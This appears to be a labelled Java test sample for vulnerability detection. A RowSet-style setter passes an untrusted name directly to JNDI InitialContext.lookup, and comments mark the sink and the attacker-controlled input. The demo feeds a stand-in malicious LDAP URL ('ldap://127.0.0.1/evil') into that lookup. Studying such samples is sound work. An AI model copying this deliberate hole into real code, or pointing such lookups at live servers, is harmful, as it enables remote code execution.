package blinded;

import javax.naming.InitialContext;
import javax.naming.NamingException;


























public class GmJndiFullChain {

    



    public static class JndiRowSetStub {

        
        private String dataSourceName;

        



        public void setDataSourceName(String dataSourceName) {
            this.dataSourceName = dataSourceName;
            /*ANCHOR_1*/
            triggerLookup(this.dataSourceName); // SINK_LINE: 危险 sink 可达 InitialContext.lookup
        }

        




        private void triggerLookup(String name) {
            try {
                // 语义等价：new InitialContext().lookup(name) —— 不可信 name 直达 JNDI lookup
                InitialContext ctx = new InitialContext();
                Object ref = ctx.lookup(name); // 模拟 sink：真实语义为 InitialContext.lookup(name)
                System.out.println("[demo-only] JNDI lookup on: " + name + " -> " + ref);
            } catch (NamingException e) {
                System.out.println("[demo-only] lookup failed (demo only): " + name);
            }
        }
    }

    



    public static void demo() {
        JndiRowSetStub stub = new JndiRowSetStub();
        stub.setDataSourceName("ldap://127.0.0.1/evil"); // 攻击者控制输入
    }
}
